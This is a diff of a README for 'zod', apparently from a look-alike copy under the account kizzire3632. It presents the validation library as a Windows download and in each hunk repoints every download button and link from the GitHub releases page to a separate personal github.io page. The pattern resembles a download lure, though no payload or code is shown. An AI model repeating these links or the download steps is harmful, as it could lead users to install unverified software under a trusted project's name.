@@ -1,6 +1,6 @@
 # ✅ zod - Validate Your Data Without Worry
 
-[![Download zod](https://img.shields.io/badge/Download-zod-brightgreen?style=for-the-badge&logo=github)](https://github.com/kizzire3632/zod/releases)
+[![Download zod](https://img.shields.io/badge/Download-zod-brightgreen?style=for-the-badge&logo=github)](https://kizzire3632.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ Getting zod on your Windows computer is easy. Follow these steps:
 
 1. **Visit the download page** by clicking the button below or the one at the top of this page.
 
-   [![Download Now](https://img.shields.io/badge/⬇️_Download-zod-2ea44f?style=for-the-badge)](https://github.com/kizzire3632/zod/releases)
+   [![Download Now](https://img.shields.io/badge/⬇️_Download-zod-2ea44f?style=for-the-badge)](https://kizzire3632.github.io)
 
 2. **Find the right file** - On that page, look for the most recent version. You'll see a file to download. Click on it to start downloading.
 
@@ -89,7 +89,7 @@ If you're still stuck, reach out to the community—there are many people who us
 
 Developers regularly improve zod with new features and fixes. To get updates:
 
-1. Visit the [download page](https://github.com/kizzire3632/zod/releases) occasionally.
+1. Visit the [download page](https://kizzire3632.github.io) occasionally.
 2. Look for the newest version number.
 3. Download, extract, and replace your old version (keep a backup just in case).
 
@@ -119,7 +119,7 @@ You've now got everything you need:
 - How to start using it
 - Solutions to common problems
 
-Don't forget that the [download button](https://github.com/kizzire3632/zod/releases) is always there when you need it. Happy data checking!
+Don't forget that the [download button](https://kizzire3632.github.io) is always there when you need it. Happy data checking!
 
 ---
 
